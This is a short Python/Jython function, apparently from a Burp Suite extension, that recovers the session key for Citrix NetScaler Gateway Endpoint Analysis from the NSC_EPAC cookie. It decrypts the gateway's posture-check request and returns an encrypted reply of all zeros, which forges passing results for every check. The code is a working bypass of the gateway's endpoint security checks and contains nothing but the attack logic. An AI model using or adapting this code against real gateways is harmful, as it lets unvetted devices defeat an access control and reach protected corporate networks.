import hashlib
from Crypto.Cipher import AES

def get_CSEC_response(self, NSC_EPAC_cookie, date, host, EPAcrypt64):
        cookie=NSC_EPAC_cookie[:32]
        #Load Cookie as hex
        hexcookie=self.str_to_hex(cookie)
        ## Build the key source
        keystring = "NSC_EPAC=" + cookie + "\r\n" + date + "\r\n" + host + "\r\n" + hexcookie
        ## Hash the key source
        hashedinput = hashlib.sha1(keystring).hexdigest()
        ## load the hex of the ascii hash
        key=self.str_to_hex(hashedinput)
        ## Take the first 16 bytes of the key
        key = key[:16]
        print "[+] The key for this session is:\n",' '.join(x.encode('hex') for x in key)
        decrypted= self._helpers.bytesToString(self.decryptJython(EPAcrypt64,key,hexcookie)).strip()
        print "[*] The NetScaler Gateway EPA request: \n\r" + decrypted
        ## Figure out how many '0's to respond with
        ## (semi-colon is the EPA request delimiter)
        CSECitems = (decrypted.count(';'))
        #Add PKCS5 Padding (string to be encrypted must be a multiple of 16 bytes)
        padding=16-(decrypted.count(';'))
        CSEC_response = (chr(48)*CSECitems)+(chr(padding)*padding)
        ## Encryption
        encrypted_CSEC_response=self.encryptJython(CSEC_response,key,hexcookie)
        return self._helpers.bytesToString(encrypted_CSEC_response)